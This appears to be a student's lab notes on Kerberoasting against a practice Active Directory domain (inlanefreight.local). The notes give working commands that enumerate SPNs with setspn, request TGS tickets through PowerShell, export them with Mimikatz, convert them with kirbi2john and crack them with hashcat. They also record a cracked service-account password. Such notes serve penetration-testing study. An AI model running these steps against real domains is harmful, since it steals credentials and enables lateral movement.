> SPNs tell us which service accounts are Kerberoastable — we request their TGS tickets (encrypted with the account's password hash), pull them offline, and crack them to get plaintext credentials for lateral movement.
## Manual Method

#### Enumerating SPNs with setspn.exe

```python
setspn.exe -Q */*
```
![[Pasted image 20260407094618.png]]
- Let's just focus on the `user accounts` and `ignore the computer accounts`. (OU = Service Accounts)

#### Using Powershell to load TGS ticket for an account into memory

##### Targeting a Single User
```python
PS C:\htb> Add-Type -AssemblyName System.IdentityModel 
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
![[Pasted image 20260407141026.png]]

- **Add-Type**: cmdlet used to add .NET framework class to our powershell session
- **AssemblyName** : parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
#### Retrieving All Tickets Using setspn.exe

```python
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
![[Pasted image 20260407100137.png]]

## Extracting Tickets from Memory with Mimikatz

```
mimikatz # base64 /out:true isBase64InterceptInput is false isBase64InterceptOutput is true mimikatz # kerberos::list /export
```

![[Pasted image 20260407141329.png]]
#### Preparing the Base64 Blob for Cracking
```python
echo "<base64 blob>" | tr -d \\n
```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

#### Placing the Output into a File as .kirbi
```python
cat encoded_file | base64 -d > sqldev.kirbi
```
- We can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

#### Extracting the Kerberos Ticket using kirbi2john.py

```python
python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

#### Modifiying crack_file for Hashcat

```python
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

We can then run the ticket through Hashcat again and get the cleartext password `database!`.

#### Cracking the Hash with Hashcat
```python
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260407141747.png]]
